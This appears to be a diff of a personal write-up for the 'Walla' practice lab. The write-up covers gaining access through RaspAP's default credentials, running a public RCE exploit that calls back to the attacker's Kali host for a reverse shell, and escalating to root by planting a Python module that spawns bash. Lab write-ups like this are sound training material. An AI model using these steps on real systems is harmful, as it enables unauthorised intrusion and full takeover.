@@ -3,7 +3,7 @@ Alias: Walla
 Date: {{date}}
 Platform: Linux
 Difficulty: Intermediate
-Tags: #RaspAPWiFiConfigurationPortal 
+Tags: #RaspAPWiFiConfigurationPortal #PythonLibraryHijackingPrivilegeEscalation
 Status: Finished
 IP: 192.168.97.97
 ---
@@ -24,11 +24,10 @@ IP: 192.168.97.97
 - Created a file named "wificontroller.py" on kali machine with the following contents "import os 
    os.system('/bin/bash')"
 - Transferred controller.py to the target machine in the "/home/directory"
-- Ran the sc
+- Ran the script and received a reverse shell as root
 
 ## Improved skills
-- skill 1
-- skill 2
+- import os; os.system bash script
 
 ## Used tools
 - nmap
@@ -165,22 +164,22 @@ Enumerated top 200 UDP ports:
 
 #### -I then ran a feroxbuster scan and found "http://192.168.97.97:8091/package.json"
 
-![](Pasted%20image%2020221111091657.png)
+![](Images/Pasted%20image%2020221111091657.png)
 
 #### -Navigated to the found .json page and found it was running "RaspAP WiFi Configuration Portal version 2.1"
 #RaspAPWiFiConfigurationPortal 
 
-![](Pasted%20image%2020221111091753.png)
+![](Images/Pasted%20image%2020221111091753.png)
 
 #### -Googled "RaspAP WiFi Configuration Portal default credentials" and found it to be username "admin" password "secret"
 
-![](Pasted%20image%2020221111091832.png)
+![](Images/Pasted%20image%2020221111091832.png)
 
 #### -Googled "RaspAP 2.1 exploit github" and found the following exploit script for Authenticated RCE
 
-![](Pasted%20image%2020221111091906.png)
+![](Images/Pasted%20image%2020221111091906.png)
 
-![](Pasted%20image%2020221111092041.png)
+![](Images/Pasted%20image%2020221111092041.png)
 
 ---
 
@@ -193,11 +192,11 @@ Enumerated top 200 UDP ports:
 
 #### -Typed "python3 exploit.py 192.168.97.97 8091 [my kali ip] 8091 secret 1" 
 
-![](Pasted%20image%2020221111092314.png)
+![](Images/Pasted%20image%2020221111092314.png)
 
 #### -Navigated back to penelope listener and received a reverse shell as wwwdata:
 
-![](Pasted%20image%2020221111092345.png)
+![](Images/Pasted%20image%2020221111092345.png)
 
 ---
 
@@ -214,14 +213,14 @@ Enumerated top 200 UDP ports:
     (ALL) NOPASSWD: /bin/systemctl stop dnsmasq.service
     (ALL) NOPASSWD: /bin/systemctl restart dnsmasq.service
 
-![](Pasted%20image%2020221111092853.png)
+![](Images/Pasted%20image%2020221111092853.png)
 
 #### -Typed "python wifi_reset.py" and I received the following output:
 
-![](Pasted%20image%2020221111093000.png)
+![](Images/Pasted%20image%2020221111093000.png)
 
 #### -Typed "python -c 'import sys; print(sys.path)'" to receive a  list of directories that Python looks in when importing modules. Received the following output showing it looks in the current directory first:
-![](Pasted%20image%2020221111093133.png)
+![](Images/Pasted%20image%2020221111093133.png)
 
 ## Privilege Escalation vector
 
@@ -234,6 +233,6 @@ os.system('/bin/bash')
 
 #### -Typed "sudo /usr/bin/python /home/walter/wifi_reset.py" and received a root shell:
 
-![](Pasted%20image%2020221111093244.png)
+![](Images/Pasted%20image%2020221111093244.png)
 
 ---
